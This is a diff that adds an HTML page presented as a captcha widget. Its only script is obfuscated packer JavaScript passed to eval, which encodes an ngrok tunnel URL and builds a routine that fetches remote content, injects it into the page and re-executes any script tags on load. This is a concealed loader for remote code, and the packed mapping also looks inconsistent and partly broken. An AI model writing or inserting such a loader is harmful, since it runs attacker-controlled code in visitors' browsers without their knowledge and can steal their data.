@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"></head>
+<body>
+<div id="captcha-container"></div>
+
+<script>
+eval((function(p,a,c,k,e,r){
+  e=function(c){return c.toString(36)};
+  if(!''.replace(/^/,String)){
+    while(c--)r[c.toString(a)]=k[c]||c.toString(a);
+    k=[function(e){return r[e]}];
+    e=function(){return'\\w+'};
+    c=1;
+  };
+  while(c--)
+    if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);
+  return p;
+})(
+  '1(0(){6 a=[\'68\',\'74\',\'74\',\'70\',\'73\',\':\',\'/\',\'/\',\'h\',\'e\',\'l\',\'p\',\'f\',\'u\',\'l\',\'-\',\'u\',\'s\',\'u\',\'a\',\'l\',\'l\',\'y\',\'-\',\'t\',\'u\',\'r\',\'t\',\'l\',\'e\',\'.\',\'n\',\'g\',\'r\',\'o\',\'k\',\'-\',\'f\',\'r\',\'e\',\'e\',\'.\',\'a\',\'p\',\'p\',\'/\',\'a\',\'p\',\'i\',\'?\',\'k\',\'=\'],7 b=[\'c\',\'a\',\'p\',\'t\',\'c\',\'h\',\'a\',\'-\',\'c\',\'o\',\'n\',\'t\',\'a\',\'i\',\'n\',\'e\',\'r\'];2 c(d){4 e=3.d(5(d,16)||d.8(0));9 e}1 f(){a 5=0.10(c(a));a 11=5.12();13.14.15(b.16()).17=11;13.14.15(b.16()).18(\'19\').20(d=>{a e=13.21(\'19\');e.17=d.17;13.22.23(e).24()})}25 f()})();',
+  26,26,
+  '|async|function|window|return|parseInt|const|c|charCodeAt|join|fetch|html|text|document|getElementById|innerHTML|map|split|querySelectorAll|script|forEach|oldScript|createElement|text|head|appendChild|remove|await|loadCaptcha'.split('|'),0,{}
+));
+</script>
+</body>
+</html>
